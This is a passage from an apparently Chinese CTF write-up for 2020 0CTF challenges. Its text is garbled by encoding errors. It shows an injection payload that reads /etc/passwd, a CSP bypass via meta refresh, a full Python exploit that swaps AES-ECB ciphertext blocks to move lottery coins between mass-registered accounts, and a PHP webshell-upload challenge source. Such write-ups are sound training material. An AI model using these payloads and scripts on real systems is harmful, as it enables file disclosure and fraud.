class="line">[&#123;&quot;type&quot;:0,&quot;message&quot;:&quot;Love you!&quot;&#125;,&#123;&quot;type&quot;:1,&quot;message&quot;:&quot;[pout\&quot;&#x2F;&gt;&lt;image href&#x3D;\&quot;text:&#x2F;etc&#x2F;passwd\&quot; width&#x3D;\&quot;1000\&quot; height&#x3D;\&quot;1000\&quot;&#x2F;&gt; ]Me too!!!&quot;&#125;]</span><br></pre></td></tr></table></figure><p>å¯ä»¥è¯»å– /etc/passwdï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-546148cd9acbbf6f.png" alt="image.png"></p><p>ç›²çŒœç›´æ¥è¯»å– /app/app.pyï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-60ec9cb04ada30dc.png" alt="image.png"></p><p>è®¿é—®ï¼š<a href="http://pwnable.org:5000/SUp3r_S3cret_URL/0Nly_4dM1n_Kn0ws">http://pwnable.org:5000/SUp3r_S3cret_URL/0Nly_4dM1n_Kn0ws</a></p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-1404f82ce510e8ef.png" alt="image.png"></p><p>éœ€è¦ alert(1)ï¼Œä½†æ˜¯æœ‰cspï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: img-src * data:; default-src &#39;self&#39;; style-src &#39;self&#39; &#39;unsafe-inline&#39;; connect-src &#39;self&#39;; object-src &#39;none&#39;; base-uri &#39;self&#39;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ meta refreshè¿›è¡Œè·³è½¬ï¼Œmetaè¢«è¿‡æ»¤ä½¿ç”¨åŒå†™ç»•è¿‡ï¼Œæ„é€ ä»¥ä¸‹payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123;&quot;type&quot;:0,&quot;message&quot;:&quot;Love you!&quot;&#125;,&#123;&quot;type&quot;:1,&quot;message&quot;:&quot;[pout\&quot;&#x2F;&gt;&lt;memetata http-equiv&#x3D;\&quot;refresh\&quot; content&#x3D;\&quot;0; url&#x3D;http:&#x2F;&#x2F;*****\&quot;&gt;&lt;&#x2F;memetata&gt;\&quot;]Me too!!!&quot;&#125;]</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/9223743-78de0f37e1b8b635.png" alt="image.png"></p><p>æœåŠ¡å™¨ä¸Šæ˜¯:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°è·¯å¾„ï¼Œæ¢æˆhtmåç¼€ï¼Œæäº¤ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-6abbf2c7415b6841.png" alt="image.png"></p><h3 id="lottery"><a href="#lottery" class="headerlink" title="lottery"></a>lottery</h3><p>åˆ†æé¢˜ç›®ï¼Œåˆå§‹è´¦æˆ· 30 ä¸ª coinï¼Œéœ€è¦ 99 ä¸ª coin ä¹° flagï¼ŒèŠ± 10 ä¸ªcoinä¹°å½©ç¥¨ï¼Œå¾—åˆ°çš„å›æŠ¥ä¸€èˆ¬å°äºç­‰äº 10 ä¸ªcoinã€‚</p><p>æµç¨‹å¤§ä½“å¦‚ä¸‹ï¼š</p><ol><li>ç™»é™†è´¦æˆ·ï¼Œè¿”å›api_tokenï¼›</li><li>ç‚¹å‡»ä¹°å½©ç¥¨ï¼Œå‘ <code>/lottery/buy</code> æ¥å£å‘é€ api_tokenï¼Œè¿”å› encï¼ˆåŠ å¯†çš„è®¢å•ä¿¡æ¯ï¼‰ã€‚</li><li>å‘ <code>/lottery/info</code> æ¥å£å‘é€ encï¼Œå¾—åˆ°è®¢å•ä¿¡æ¯ã€‚ï¼ˆlotteryçš„uuidï¼Œuserçš„uuidä»¥åŠå¾—åˆ°çš„coinï¼‰</li><li>ç‚¹å‡»chargeï¼Œå‘<code>/lottery/charge</code>æ¥å£å‘é€ userçš„uuidã€coinä»¥åŠencï¼ŒæœåŠ¡ç«¯å¯¹encè§£å¯†ï¼Œæ ¡éªŒ useruuidï¼Œæ— è¯¯æŠŠè§£å¯†å¾—åˆ°çš„coinåŠ åˆ°user uuid å¯¹åº”çš„userä¸Šã€‚</li></ol><p>åˆ†æå…³é”®çš„encï¼Œæ‹¿ä¸¤æ¬¡ buy å¾—åˆ°çš„encå¯¹æ¯”ï¼Œå‘ç°æ˜¯ 16 å­—èŠ‚ä¸€ç»„ï¼Œä¸€å…± 8 ç»„ï¼Œä¸­é—´è¿˜æœ‰ä¸€äº›ç»„å¯†æ–‡ç›¸åŒï¼Œä¸éš¾å¾—å‡ºåŠ å¯†æ¨¡å¼æ˜¯ AES ECBæ¨¡å¼ã€‚<code>/lottery/info</code>æ¥å£æä¾›äº† enc è§£å¯†çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥ä¿æŒä¸€ä¸ªencä¸å˜ï¼Œå¦ä¸€ä¸ªencæ¯ä¸ªåˆ†ç»„åˆ†åˆ«æ›¿æ¢æˆä¸å˜çš„encå¯¹åº”çš„åˆ†ç»„ï¼Œä¾æ¬¡å¯¹æ¯”è§£å¯†ä¿¡æ¯çš„ä¸åŒï¼Œå¯ä»¥å‘ç°user uuidæ¶‰åŠå››ä¸ªåˆ†ç»„ï¼Œä»ç¬¬å››ä¸ªåˆ†ç»„åˆ°å€’æ•°ç¬¬äºŒä¸ªåˆ†ç»„ã€‚</p><p>ä»¥ uuid ä¸º 390e0a78-49ff-4264-8ddd-8b902319d189 ä¸ºä¾‹ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ç¬¬å››ç»„ï¼š xxxxxxxxxxxxxx39</span><br><span class="line">ç¬¬äº”ç»„ï¼š 0e0a78-49ff-4264</span><br><span class="line">ç¬¬å…­ç»„ï¼š -8ddd-8b902319d1</span><br><span class="line">ç¬¬ä¸ƒç»„ï¼š 89xxxxxxxxxxxxxx</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æœ‰ä¸€ä¸ªè´¦æˆ·Aï¼Œå¯ä»¥æ­£å¸¸ä¹°å½©ç¥¨ï¼Œå¦‚æœæˆ‘ä»¬æ‰¾åˆ°ä¸€ä¸ªuuid å‰ä¸¤ä½å’Œåä¸¤ä½ä¸è´¦æˆ·Aç›¸åŒçš„è´¦æˆ·Bï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç”¨è´¦æˆ·B buy å½©ç¥¨ï¼Œå¾—åˆ° enc åæŠŠchargeå¾—é’±çš„è´¦æˆ·æ”¹æˆè´¦æˆ·Aï¼ˆæŠŠencç¬¬äº”ç»„ä¸ç¬¬å…­ç»„æ›¿æ¢æˆè´¦æˆ·Açš„å¯†æ–‡ï¼‰ï¼Œè¿™æ ·å°±æŠŠå¾—åˆ°çš„é’±è½¬åˆ°Aä¸Šäº†ï¼Œå¹¶ä¸”ä¹°å½©ç¥¨ç”¨çš„æ˜¯Bè´¦æˆ·çš„coinã€‚å¤šæ‰¾å‡ ä¸ªè¿™æ ·çš„è´¦æˆ·Bï¼ŒæŠŠé’±éƒ½è½¬åˆ°è´¦æˆ·Aä¸Šï¼Œå°±å¯ä»¥å¾—åˆ°99ä¸ªcoinäº†ã€‚</p><p>æˆ‘ä»¬éœ€è¦çˆ†ç ´ä¸€å † uuid çš„å‰ä¸¤ä½å’Œåä¸¤ä½éƒ½ä¸€æ ·çš„è´¦æˆ·ï¼Œç„¶åæŠŠè½¬åˆ°ä¸€ä¸ªè´¦æˆ·ä¸Šã€‚è¿æ°”å¥½çš„è¯å¤§æ¦‚éœ€è¦çˆ†äº”å…­ä¸ªè¿™æ ·çš„è´¦æˆ·ã€‚</p><p>çˆ†ç ´å¾ˆæ…¢â€¦ é‡‡ç”¨å¤šè¿›ç¨‹æ–¹å¼ï¼Œè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool, Manager, Value</span><br><span class="line"><span class="keyword">import</span> random, string</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span>(<span class="params"><span class="built_in">dict</span>, now_num</span>):</span></span><br><span class="line">    user = <span class="string">&quot;&quot;</span>.join([random.choice(string.printable) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)])</span><br><span class="line">    session = requests.Session()</span><br><span class="line">    paramsPost = &#123;<span class="string">&quot;password&quot;</span>: user, <span class="string">&quot;username&quot;</span>: user&#125;</span><br><span class="line">    headers = &#123;<span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://pwnable.org:2333&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>, <span class="string">&quot;X-Requested-With&quot;</span>: <span class="string">&quot;XMLHttpRequest&quot;</span>,</span><br><span class="line">               <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://pwnable.org:2333/index.html&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span>&#125;</span><br><span class="line">    response = session.post(<span class="string">&quot;http://pwnable.org:2333/user/register&quot;</span>, data=paramsPost, headers=headers)</span><br><span class="line">    data = response.content.strip()</span><br><span class="line">    data = json.loads(data)</span><br><span class="line">    uuid = data[<span class="string">&quot;user&quot;</span>][<span class="string">&quot;uuid&quot;</span>]</span><br><span class="line">    key = uuid[:<span class="number">2</span>] + uuid[<span class="number">-2</span>:]</span><br><span class="line">    resp = session.post(<span class="string">&quot;http://pwnable.org:2333/user/login&quot;</span>, data=&#123;<span class="string">&#x27;username&#x27;</span>: user, <span class="string">&#x27;password&#x27;</span>: user&#125;)</span><br><span class="line">    data = json.loads(resp.content.strip())</span><br><span class="line">    api_token = data[<span class="string">&quot;user&quot;</span>][<span class="string">&quot;api_token&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">        tmp = <span class="built_in">dict</span>[key]</span><br><span class="line">        tmp.append(api_token)</span><br><span class="line">        <span class="built_in">dict</span>[key] = tmp</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tmp = [api_token]</span><br><span class="line">        <span class="built_in">dict</span>[key] = tmp</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">dict</span>[key]) &gt; now_num[<span class="string">&quot;num&quot;</span>]:</span><br><span class="line">        now_num[<span class="string">&quot;num&quot;</span>] = <span class="built_in">len</span>(<span class="built_in">dict</span>[key])</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;now amount: %s,now api_token: %s&quot;</span> % (now_num[<span class="string">&quot;num&quot;</span>], <span class="built_in">dict</span>[key])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">processPools</span>():</span></span><br><span class="line">    num = <span class="number">10</span></span><br><span class="line">    pool = Pool(processes=num)</span><br><span class="line">    jobs = []</span><br><span class="line">    manager = Manager()</span><br><span class="line">    <span class="built_in">dict</span> = manager.<span class="built_in">dict</span>()</span><br><span class="line">    now_num = manager.<span class="built_in">dict</span>()</span><br><span class="line">    now_num[<span class="string">&quot;num&quot;</span>] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span> ** <span class="number">16</span>):</span><br><span class="line">        job = pool.apply_async(register, (<span class="built_in">dict</span>, now_num))</span><br><span class="line">        jobs.append(job)</span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">charge</span>(<span class="params">user, coin, enc</span>):</span></span><br><span class="line">    session = requests.Session()</span><br><span class="line"></span><br><span class="line">    paramsPost = &#123;</span><br><span class="line">        <span class="string">&quot;enc&quot;</span>: enc,</span><br><span class="line">        <span class="string">&quot;user&quot;</span>: user, <span class="string">&quot;coin&quot;</span>: coin&#125;</span><br><span class="line">    headers = &#123;<span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://pwnable.org:2333&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>, <span class="string">&quot;X-Requested-With&quot;</span>: <span class="string">&quot;XMLHttpRequest&quot;</span>,</span><br><span class="line">               <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://pwnable.org:2333/lottery.html&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span>&#125;</span><br><span class="line">    response = session.post(<span class="string">&quot;http://pwnable.org:2333/lottery/charge&quot;</span>, data=paramsPost, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;invalid&quot;</span> <span class="keyword">in</span> response.content:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;error!&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">api_token_list</span>):</span></span><br><span class="line">    account = api_token_list[<span class="number">0</span>]</span><br><span class="line">    other = api_token_list[<span class="number">1</span>:]</span><br><span class="line">    data = requests.get(<span class="string">&quot;http://pwnable.org:2333/user/info&quot;</span>, params=&#123;<span class="string">&#x27;api_token&#x27;</span>: account&#125;).content.strip()</span><br><span class="line">    uuid = json.loads(data)[<span class="string">&quot;user&quot;</span>][<span class="string">&quot;uuid&quot;</span>]</span><br><span class="line">    data = requests.post(<span class="string">&#x27;http://pwnable.org:2333/lottery/buy&#x27;</span>, data=&#123;<span class="string">&#x27;api_token&#x27;</span>: account&#125;).content.strip()</span><br><span class="line">    enc = json.loads(data)[<span class="string">&#x27;enc&#x27;</span>]</span><br><span class="line">    middle = b64decode(enc)[<span class="number">-64</span>:<span class="number">-32</span>]</span><br><span class="line">    data = requests.post(<span class="string">&quot;http://pwnable.org:2333/lottery/info&quot;</span>, data=&#123;<span class="string">&#x27;enc&#x27;</span>: enc&#125;).content.strip()</span><br><span class="line">    coin = json.loads(data)[<span class="string">&#x27;info&#x27;</span>][<span class="string">&#x27;coin&#x27;</span>]</span><br><span class="line">    charge(uuid, coin, enc)</span><br><span class="line">    <span class="keyword">for</span> api_token <span class="keyword">in</span> other:</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            data = requests.post(<span class="string">&#x27;http://pwnable.org:2333/lottery/buy&#x27;</span>, data=&#123;<span class="string">&#x27;api_token&#x27;</span>: api_token&#125;).content.strip()</span><br><span class="line">            enc = json.loads(data)[<span class="string">&#x27;enc&#x27;</span>]</span><br><span class="line">            data = requests.post(<span class="string">&quot;http://pwnable.org:2333/lottery/info&quot;</span>, data=&#123;<span class="string">&#x27;enc&#x27;</span>: enc&#125;).content.strip()</span><br><span class="line">            coin = json.loads(data)[<span class="string">&#x27;info&#x27;</span>][<span class="string">&#x27;coin&#x27;</span>]</span><br><span class="line">            tmp = b64decode(enc)</span><br><span class="line">            new_enc = b64encode(tmp[:<span class="number">-64</span>] + middle + tmp[<span class="number">-32</span>:])</span><br><span class="line">            <span class="keyword">assert</span> <span class="built_in">len</span>(b64decode(new_enc)) == <span class="number">128</span></span><br><span class="line">            charge(uuid, coin, new_enc)</span><br><span class="line">    data = requests.get(<span class="string">&quot;http://pwnable.org:2333/user/info&quot;</span>, params=&#123;<span class="string">&#x27;api_token&#x27;</span>: account&#125;).content.strip()</span><br><span class="line">    <span class="built_in">print</span> data</span><br><span class="line">    data = requests.post(<span class="string">&quot;http://pwnable.org:2333/flag&quot;</span>, data=&#123;<span class="string">&#x27;api_token&#x27;</span>: account&#125;).content.strip()</span><br><span class="line">    <span class="built_in">print</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    api_token_list = [<span class="string">&#x27;s4XmpFIYOMnM3YvSRq5MvNSabOheYocT&#x27;</span>, <span class="string">&#x27;p8wRiFb5r17EUBxC9BcAV2NwKlxY6EXE&#x27;</span>,</span><br><span class="line">                      <span class="string">&#x27;jaJO0sOcyuU8GedKDTfOTTMsdA0GeXtW&#x27;</span>, <span class="string">&#x27;GBRa6X6ZPM15Hrd15vZzNmwbswMsTcxL&#x27;</span>,</span><br><span class="line">                      <span class="string">&#x27;V29GALnpgMFSjy5nYcGIm4Q3wWbaRE5L&#x27;</span>, <span class="string">&#x27;GaI4LnuYXhA7oUos4hiTbTvnFs1v9DnP&#x27;</span>,</span><br><span class="line">                      <span class="string">&#x27;HDfi2mG5n8j8pygZcbSiLyM7nrozjPxo&#x27;</span>]</span><br><span class="line">    exp(api_token_list)</span><br><span class="line">    <span class="comment"># processPools()</span></span><br><span class="line">    <span class="comment"># charge()</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é¦–å…ˆè¿è¡Œ <code>processPools</code>å‡½æ•°çˆ†ç ´è´¦æˆ·ï¼Œå¤§æ¦‚çˆ†åˆ° 7 ä¸ªï¼Œå·®ä¸å¤šäº†ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> âœ˜ âš™ î‚° 2020 0CTF î‚° python lottery.py</span><br><span class="line">now amount: 1,now api_token: [u<span class="string">&#x27;dz9ilcIVnOCUbyUxZtUsDHRKBmqKTWYf&#x27;</span>]</span><br><span class="line">now amount: 2,now api_token: [u<span class="string">&#x27;2KfQgLss4EuZLMP2iTttEWOvxq1pmLUH&#x27;</span>, u<span class="string">&#x27;SDZIRWRUicmv85Hckj2FxCumrisGKmxl&#x27;</span>]</span><br><span class="line">now amount: 3,now api_token: [u<span class="string">&#x27;NAdG5IiRWlmxYm4wzjQqa1q8Xe5161S4&#x27;</span>, u<span class="string">&#x27;sfpKMPQ7tnvNC2WlvppGioIc4SCn6gKy&#x27;</span>, u<span class="string">&#x27;Fgj3zGX8NyFPCqlF3HloEfWdaonW3Mz8&#x27;</span>]</span><br><span class="line">now amount: 4,now api_token: [u<span class="string">&#x27;Z2LezEeeKU9iaU8K0MhNV8R6UBKwYn7p&#x27;</span>, u<span class="string">&#x27;LE7f7JzgFHjefO1S0NAtlI0X1xXEzLRg&#x27;</span>, u<span class="string">&#x27;TZvfPzGPW03PlynxFCCFpDVTli2xcu4O&#x27;</span>, u<span class="string">&#x27;Nipjkdoz3hAne81ihDzM9REMtnplJUkh&#x27;</span>]</span><br><span class="line">now amount: 5,now api_token: [u<span class="string">&#x27;Z2LezEeeKU9iaU8K0MhNV8R6UBKwYn7p&#x27;</span>, u<span class="string">&#x27;LE7f7JzgFHjefO1S0NAtlI0X1xXEzLRg&#x27;</span>, u<span class="string">&#x27;TZvfPzGPW03PlynxFCCFpDVTli2xcu4O&#x27;</span>, u<span class="string">&#x27;Nipjkdoz3hAne81ihDzM9REMtnplJUkh&#x27;</span>, u<span class="string">&#x27;0kH6ATi6o24iBUZHorJ1ArdV23GVJuMr&#x27;</span>]</span><br><span class="line">now amount: 6,now api_token: [u<span class="string">&#x27;s4XmpFIYOMnM3YvSRq5MvNSabOheYocT&#x27;</span>, u<span class="string">&#x27;p8wRiFb5r17EUBxC9BcAV2NwKlxY6EXE&#x27;</span>, u<span class="string">&#x27;jaJO0sOcyuU8GedKDTfOTTMsdA0GeXtW&#x27;</span>, u<span class="string">&#x27;GBRa6X6ZPM15Hrd15vZzNmwbswMsTcxL&#x27;</span>, u<span class="string">&#x27;V29GALnpgMFSjy5nYcGIm4Q3wWbaRE5L&#x27;</span>, u<span class="string">&#x27;GaI4LnuYXhA7oUos4hiTbTvnFs1v9DnP&#x27;</span>]</span><br><span class="line">now amount: 7,now api_token: [u<span class="string">&#x27;s4XmpFIYOMnM3YvSRq5MvNSabOheYocT&#x27;</span>, u<span class="string">&#x27;p8wRiFb5r17EUBxC9BcAV2NwKlxY6EXE&#x27;</span>, u<span class="string">&#x27;jaJO0sOcyuU8GedKDTfOTTMsdA0GeXtW&#x27;</span>, u<span class="string">&#x27;GBRa6X6ZPM15Hrd15vZzNmwbswMsTcxL&#x27;</span>, u<span class="string">&#x27;V29GALnpgMFSjy5nYcGIm4Q3wWbaRE5L&#x27;</span>, u<span class="string">&#x27;GaI4LnuYXhA7oUos4hiTbTvnFs1v9DnP&#x27;</span>, u<span class="string">&#x27;HDfi2mG5n8j8pygZcbSiLyM7nrozjPxo&#x27;</span>]</span><br></pre></td></tr></table></figure><p>æŠŠ api_token å¤åˆ¶ä¸‹æ¥ï¼Œè¿è¡Œ <code>exp</code>å‡½æ•°ï¼Œä¸€ä¸ªè´¦æˆ·å¯ä»¥è½¬ä¸‰æ¬¡ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> âœ˜ âš™ î‚° 2020 0CTF î‚° python lottery.py</span><br><span class="line">&#123;<span class="string">&quot;user&quot;</span>:&#123;<span class="string">&quot;id&quot;</span>:538474,<span class="string">&quot;uuid&quot;</span>:<span class="string">&quot;8f97310b-6784-41a0-8e1f-714266517dbd&quot;</span>,<span class="string">&quot;username&quot;</span>:<span class="string">&quot;&#x27;\&quot;*Lv&quot;</span>,<span class="string">&quot;api_token&quot;</span>:<span class="string">&quot;s4XmpFIYOMnM3YvSRq5MvNSabOheYocT&quot;</span>,<span class="string">&quot;coin&quot;</span>:115,<span class="string">&quot;created_at&quot;</span>:<span class="string">&quot;2020-06-29T08:04:30.000000Z&quot;</span>,<span class="string">&quot;updated_at&quot;</span>:<span class="string">&quot;2020-06-29T09:03:55.000000Z&quot;</span>&#125;&#125;</span><br><span class="line">&#123;<span class="string">&quot;flag&quot;</span>:<span class="string">&quot;flag&#123;f1d6356a-4288-4a13-a28a-78da73328493&#125;&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>PSï¼šè¿™ç§åšæ³•æ˜¯æ¢useridï¼Œä¹Ÿå¯ä»¥æ¢ lottery çš„uuidï¼Œè¿™æ ·åªéœ€è¦çˆ†ç ´uuidå‰ä¸¤ä½çš„useräº†ï¼Œæ›´å¿«ä¹Ÿä¸ç”¨å¤šè¿›ç¨‹äº†ã€‚</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="cloud-computing"><a href="#cloud-computing" class="headerlink" title="cloud computing"></a>cloud computing</h3><p>æ‰“å¼€é¢˜ç›®ï¼Œçœ‹èµ·æ¥å¯ä»¥å†™ä¸€ä¸ª webshellï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;function.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">$dir = <span class="string">&#x27;sandbox/&#x27;</span> . sha1($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] . $_SERVER[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!file_exists($dir))&#123;</span><br><span class="line">  mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">&quot;action&quot;</span>] ?? <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;pwd&#x27;</span>:</span><br><span class="line">    <span class="keyword">echo</span> $dir;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">    $data = $_GET[<span class="string">&quot;data&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (waf($data)) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;waf sucks...&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    file_put_contents(<span class="string">&quot;<span class="subst">$dir</span>&quot;</span> . <span class="string">&quot;index.php&quot;</span>, $data);</span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;shell&#x27;</span>:</span><br><span class="line">    initShellEnv($dir);</span><br><span class="line">    <span class="keyword">include</span> $dir . <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸è¿‡ waf æœ‰è¿‡æ»¤ï¼Œå¯ä»¥è€ƒè™‘ç”¨æ•°ç»„ç»•è¿‡ï¼Œfile_put_contents 